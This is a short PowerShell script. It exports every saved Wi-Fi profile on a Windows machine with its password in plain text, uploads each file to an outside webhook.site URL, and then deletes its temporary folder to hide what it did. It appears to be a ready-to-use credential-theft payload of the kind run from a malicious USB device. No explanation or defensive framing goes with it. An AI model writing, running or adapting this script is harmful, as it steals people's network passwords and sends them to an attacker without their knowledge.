$u = "https://webhook.site/3e30b3d0-304b-4218-b056-44158ad60822"
$t = "$env:TEMP\w"
md $t -f | Out-Null
cd $t
netsh wlan export profile key=clear | Out-Null
ls *.xml | % { iwr $u -Method Post -InFile $_.FullName }
cd $env:TEMP
rm $t -r -f
